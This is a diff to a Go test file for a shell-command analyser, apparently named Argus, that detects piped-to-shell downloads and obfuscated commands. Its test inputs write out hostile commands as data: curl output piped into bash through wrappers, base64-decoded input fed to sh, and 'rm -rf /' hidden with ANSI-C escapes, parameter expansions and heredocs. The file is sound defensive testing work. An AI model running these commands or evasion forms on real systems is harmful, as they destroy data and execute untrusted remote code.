@@ -87,6 +87,34 @@ func TestBase64PipeShellObfuscated(t *testing.T) {
 		t.Fatal("base64|sh must flag obfuscated")
 	}
 }
+
+// A shell piped behind a prefix wrapper (`… | timeout 5 bash`) must still
+// surface as a pipe sink, or the pipe-to-shell floor is dodged by the wrapper.
+func TestPipeSinkThroughWrapper(t *testing.T) {
+	shellSink := func(f Facts) bool {
+		for _, s := range f.PipeSinks {
+			if s == "bash" || s == "sh" || s == "zsh" {
+				return true
+			}
+		}
+		return false
+	}
+	for _, cmd := range []string{
+		"curl http://e | timeout 5 bash", // wrapper with a duration arg before bash
+		"curl http://e | env bash",
+		"curl http://e | nice -n 10 bash",
+		"curl http://e | nohup bash",
+		"curl http://e | sudo timeout 5 bash", // nested wrappers
+	} {
+		if !shellSink(Extract(cmd)) {
+			t.Fatalf("%q: wrapped shell must surface as a pipe sink, got %v", cmd, Extract(cmd).PipeSinks)
+		}
+	}
+	// decoder-into-shell must still be caught through a wrapper.
+	if !Extract("echo x | base64 -d | timeout 5 sh").Obfuscated {
+		t.Fatal("decoder | wrapper shell must flag obfuscated")
+	}
+}
 func TestParseFailurePopulatesRaw(t *testing.T) {
 	f := Extract("`unterminated")
 	if f.ParseOK || len(f.RawTokens) == 0 || !f.Obfuscated {
@@ -293,6 +321,80 @@ func BenchmarkExtractNestedLoops(b *testing.B) {
 	b.ResetTimer()
 	for i := 0; i < b.N; i++ {
 		_ = Extract(loop)
+	}
+}
+
+// ANSI-C $'...' quoting is decoded by the shell (\xNN, \NNN, \uNNNN, \n, …);
+// Argus must decode it too so an escaped verb surfaces instead of reading as a
+// benign literal. `$'\x72\x6d'` is `rm`.
+func TestANSICQuotingDecoded(t *testing.T) {
+	for _, cmd := range []string{
+		`$'\x72\x6d' -rf ~`, // hex
+		`$'\162\155' -rf ~`, // octal
+		`$'\x72'm -rf ~`,    // mixed with adjacent literal
+	} {
+		f := Extract(cmd)
+		if !hasCmd(f, "rm") {
+			t.Fatalf("%q: ANSI-C escape must decode to rm, got %+v", cmd, f.Commands)
+		}
+		if f.Obfuscated {
+			t.Fatalf("%q: a decodable ANSI-C literal should resolve, not flag obfuscated", cmd)
+		}
+	}
+	// Benign ANSI-C escapes still resolve (not obfuscated).
+	if Extract(`printf '%s' $'a\tb'`).Obfuscated {
+		t.Fatal("benign $'a\\tb' must not be obfuscated")
+	}
+	// An unrecognized escape is kept literal (bash behavior), still resolved.
+	if got := decodeANSIC(`\z`); got != `\z` {
+		t.Fatalf("decodeANSIC(\\z) = %q, want \\z", got)
+	}
+	if got := decodeANSIC(`\x72\x6d`); got != "rm" {
+		t.Fatalf("decodeANSIC(hex) = %q, want rm", got)
+	}
+}
+
+// A parameter expansion carrying a MODIFIER (indirect, strip, replace, slice,
+// case, length) transforms the stored value; emitting the untransformed value
+// would read a benign string where the shell produces a dangerous one. Every
+// non-plain form must be treated as unresolved (fail closed).
+func TestParamExpModifierFailsClosed(t *testing.T) {
+	for _, cmd := range []string{
+		`X=CMD; CMD=rm; ${!X} -rf /`,   // indirect
+		`X=safe_rm; ${X/safe_/} -rf /`, // replace
+		`X=foorm; ${X#foo} -rf /`,      // prefix strip
+		`X=rmzz; ${X%zz} -rf /`,        // suffix strip
+		`X=zzrm; ${X:2} -rf /`,         // slice
+		`X=RM; ${X,,} -rf /`,           // case-mod
+	} {
+		if !Extract(cmd).Obfuscated {
+			t.Fatalf("%q: modifier param-exp must fail closed (obfuscated)", cmd)
+		}
+	}
+	// Plain ${X}/$X still resolve to the concrete verb (no false obfuscation).
+	if !hasCmd(Extract(`X=rm; ${X} -rf /`), "rm") {
+		t.Fatal("plain ${X} must resolve to rm")
+	}
+	if Extract(`X=rm; ${X} -rf /tmp/x`).Obfuscated {
+		t.Fatal("plain ${X} must not be obfuscated")
+	}
+}
+
+// A shell that reads its code from a here-string / here-doc redirect is
+// smuggling executable text past argv inspection, exactly like decoder|shell.
+func TestShellHereDocSmugglingObfuscates(t *testing.T) {
+	for _, cmd := range []string{
+		`bash <<< "rm -rf /"`,
+		"sh <<EOF\nrm -rf /\nEOF\n",
+		`zsh <<<'evil'`,
+	} {
+		if !Extract(cmd).Obfuscated {
+			t.Fatalf("%q: shell reading code from a heredoc/herestring must be obfuscated", cmd)
+		}
+	}
+	// A non-shell reading a heredoc is fine (cat is not an interpreter).
+	if Extract("cat <<EOF\nhello\nEOF\n").Obfuscated {
+		t.Fatal("cat <<EOF must not be obfuscated")
 	}
 }
 
